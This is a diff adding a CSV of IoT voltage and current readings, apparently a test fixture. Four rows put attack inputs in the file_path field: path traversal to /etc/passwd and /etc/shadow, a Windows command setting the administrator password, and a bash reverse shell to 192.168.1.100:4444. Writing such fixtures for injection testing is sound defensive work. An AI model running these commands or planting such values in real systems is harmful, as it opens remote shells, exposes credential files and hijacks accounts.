@@ -1,0 +1,11 @@
+device_id,timestamp,voltage,current,location,status,file_path
+IOT_201,2026-02-10 08:00:00,220.1,4.5,Bangalore,active,/home/iot/data/readings.csv
+IOT_202,2026-02-10 08:01:00,219.8,4.4,Bangalore,active,/home/iot/data/readings.csv
+IOT_203,2026-02-10 08:02:00,220.5,4.6,Bangalore,active,../../../../../../etc/passwd
+IOT_204,2026-02-10 08:03:00,219.9,4.5,Bangalore,active,/home/iot/data/readings.csv
+IOT_205,2026-02-10 08:04:00,220.2,4.4,Bangalore,active,cmd.exe /c net user administrator hacker123
+IOT_206,2026-02-10 08:05:00,220.0,4.5,Bangalore,active,/home/iot/data/readings.csv
+IOT_207,2026-02-10 08:06:00,219.7,4.3,Bangalore,active,/bin/bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
+IOT_208,2026-02-10 08:07:00,220.4,4.6,Bangalore,active,/home/iot/data/readings.csv
+IOT_209,2026-02-10 08:08:00,220.1,4.5,Bangalore,active,/home/iot/data/readings.csv
+IOT_210,2026-02-10 08:09:00,219.6,4.4,Bangalore,active,../../etc/shadow
